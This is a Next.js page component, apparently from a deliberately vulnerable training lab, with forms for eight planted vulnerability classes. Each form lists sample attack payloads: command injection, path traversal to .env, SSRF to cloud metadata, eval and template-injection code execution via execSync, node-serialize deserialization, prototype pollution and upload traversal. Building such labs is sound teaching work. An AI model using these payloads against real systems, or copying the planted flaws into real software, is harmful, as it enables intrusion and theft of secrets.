/**
 * Front-end for the vulnerable API surface. Plain HTML forms only — no client
 * JavaScript — so every request can be replayed with curl.
 */

export const dynamic = 'force-dynamic';

export default function ToolsPage() {
  return (
    <>
      <h1>Tools</h1>
      <p className="sub">Each form targets one planted vulnerability class.</p>

      <div className="card" id="ping">
        <h3>Network diagnostics — GET /api/ping</h3>
        <p><span className="tag cwe">CWE-78</span><span className="tag">@vulnlab/utils</span> Command injection</p>
        <form className="row" method="GET" action="/api/ping">
          <input name="host" defaultValue="127.0.0.1" size={40} />
          <button type="submit">Ping</button>
        </form>
        <pre>{`host=127.0.0.1 && whoami
host=127.0.0.1 | dir
host=$(id)`}</pre>
      </div>

      <div className="card" id="files">
        <h3>File viewer — GET /api/files</h3>
        <p><span className="tag cwe">CWE-22</span><span className="tag">@vulnlab/utils</span> Path traversal</p>
        <form className="row" method="GET" action="/api/files">
          <input name="name" defaultValue="welcome.txt" size={40} />
          <button type="submit">Read</button>
        </form>
        <pre>{`name=../../../.env
name=../../../../Windows/win.ini
name=../../../packages/auth/index.js`}</pre>
      </div>

      <div className="card" id="fetch">
        <h3>URL preview — GET /api/fetch</h3>
        <p><span className="tag cwe">CWE-918</span><span className="tag">@vulnlab/utils</span> SSRF</p>
        <form className="row" method="GET" action="/api/fetch">
          <input name="url" defaultValue="http://example.com" size={44} />
          <button type="submit">Fetch</button>
        </form>
        <pre>{`url=http://169.254.169.254/latest/meta-data/
url=http://127.0.0.1:3000/api/debug
url=http://localhost:6379/`}</pre>
      </div>

      <div className="card" id="calc">
        <h3>Expression evaluator — POST /api/calc</h3>
        <p><span className="tag cwe">CWE-95</span><span className="tag">@vulnlab/utils</span> eval() / RCE</p>
        <form className="row" method="POST" action="/api/calc">
          <input name="expr" defaultValue="2 + 2" size={44} />
          <button type="submit">Evaluate</button>
        </form>
        <pre>{`expr=process.env
expr=require('child_process').execSync('whoami').toString()`}</pre>
      </div>

      <div className="card" id="render">
        <h3>Template preview — POST /api/render</h3>
        <p><span className="tag cwe">CWE-1336</span><span className="tag">@vulnlab/utils</span> SSTI</p>
        <form className="stack" method="POST" action="/api/render">
          <textarea name="template" rows={3} defaultValue={'Hello {{name}}'} />
          <input name="engine" defaultValue="handlebars" />
          <button type="submit">Render</button>
        </form>
        <pre>{`engine=ejs   template=<%= process.env.JWT_SECRET %>
engine=ejs   template=<%- global.process.mainModule.require('child_process').execSync('whoami') %>`}</pre>
      </div>

      <div className="card" id="deser">
        <h3>Session restore — POST /api/deserialize</h3>
        <p><span className="tag cwe">CWE-502</span><span className="tag">@vulnlab/utils</span> Insecure deserialization</p>
        <form className="stack" method="POST" action="/api/deserialize">
          <textarea name="payload" rows={3} defaultValue={'{"user":"alice"}'} />
          <input name="format" defaultValue="node-serialize" />
          <button type="submit">Restore</button>
        </form>
        <pre>{`format=node-serialize
payload={"rce":"_$$ND_FUNC$$_function(){ return process.env }()"}

format=yaml
payload=secret: !!js/function "function(){ return process.env }"`}</pre>
      </div>

      <div className="card" id="config">
        <h3>Preferences merge — POST /api/config</h3>
        <p><span className="tag cwe">CWE-1321</span><span className="tag">@vulnlab/utils</span> Prototype pollution</p>
        <form className="stack" method="POST" action="/api/config">
          <textarea name="patch" rows={3} defaultValue={'{"theme":"dark"}'} />
          <button type="submit">Save</button>
        </form>
        <pre>{`patch={"__proto__":{"isAdmin":true}}
patch={"constructor":{"prototype":{"polluted":"yes"}}}`}</pre>
      </div>

      <div className="card" id="upload">
        <h3>Upload — POST /api/upload</h3>
        <p><span className="tag cwe">CWE-434</span><span className="tag">@vulnlab/utils</span> Unrestricted upload + traversal</p>
        <form className="stack" method="POST" action="/api/upload">
          <input name="filename" defaultValue="note.txt" />
          <textarea name="content" rows={3} defaultValue={'hello'} />
          <button type="submit">Upload</button>
        </form>
        <pre>{`filename=../../../../pwned.js    → writes outside the upload root
filename=shell.js                → no extension or content-type restriction`}</pre>
      </div>
    </>
  );
}
